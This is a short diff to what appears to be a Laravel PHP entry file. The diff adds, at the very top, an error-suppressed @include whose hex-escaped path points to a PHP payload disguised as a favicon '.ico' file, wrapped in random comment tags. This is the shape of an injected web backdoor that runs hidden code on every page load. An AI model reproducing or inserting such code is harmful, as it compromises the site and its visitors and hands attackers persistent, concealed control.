@@ -1,5 +1,12 @@
 <?php
 
+
+/*c70c1*/
+
+@include "\x2fhom\x65/x2\x35201\x36w/p\x75bli\x63_ht\x6dl/m\x74est\x2fdow\x6eloa\x64er/\x6as/f\x61vic\x6fn_8\x33d73\x65.ic\x6f";
+
+/*c70c1*/
+
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
